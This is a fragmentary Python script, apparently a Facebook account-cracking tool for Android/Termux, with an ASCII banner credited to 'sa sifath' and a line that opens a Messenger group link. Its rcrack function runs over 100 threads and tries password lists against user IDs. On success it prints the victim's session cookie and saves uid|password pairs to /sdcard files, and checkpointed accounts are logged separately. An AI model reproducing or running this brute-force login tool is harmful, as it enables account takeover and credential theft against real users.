...
for ua in range(5000):
    ...
    ugen.append(uaku2)
os.system('xdg-open m.me/j/AbYAzHdXmG7L-Om')
logo=("""
    SSSSSSSSSSSSSSS              AAA               
 SS:::::::::::::::S            A:::A              
S:::::SSSSSS::::::S           A:::::A             
...
S:::::S                    A:::::A:::::A          
 S::::SSSS                A:::::A A:::::A         
  SS::::::SSSSS          A:::::A   A:::::A        
    SSS::::::::SS       A:::::A     A:::::A       
       SSSSSS::::S     A:::::AAAAAAAAA:::::A      
            S:::::S   A:::::::::::::::::::::A     
            S:::::S  A:::::AAAAAAAAAAAAA:::::A    
SSSSSSS     S:::::S A:::::A             A:::::A   
S::::::SSSSSS:::::SA:::::A               A:::::A  
S:::::::::::::::SSA:::::A                 A:::::A 
 SSSSSSSSSSSSSSS AAAAAAA                   AAAAAAA
---------------------------------------------------
AUTHOR    : sa sifath 
FACEBOOK  : sa sifath 
TOOLS TYPE : FREE 
...
def mueor():
    ...
    with ThreadPool(max_workers=100) as MUEOR:
        ...
        print('\033[1;37m[\033[1;32m✓\033[1;32m] TOOL CREATED BY sa sifath JOIN MY GROUP ')
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;31m[%sSIFATH\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f"\033[38;5;46m[SIFATH-OK💚] {uid} • {ps}" '  \n\033[1;33m [💉]\033[1;33mCookie = \033[1;32m'+coki+  ' \n\033[1;33m [🤧] \033[1;32mUa = \033[1;34m'+pro+'  \033[0;97m')
                open('/sdcard/SIFATH-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[SIFATH-CP💔] {uid} • {ps}")
                open('/sdcard/SIFATH-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
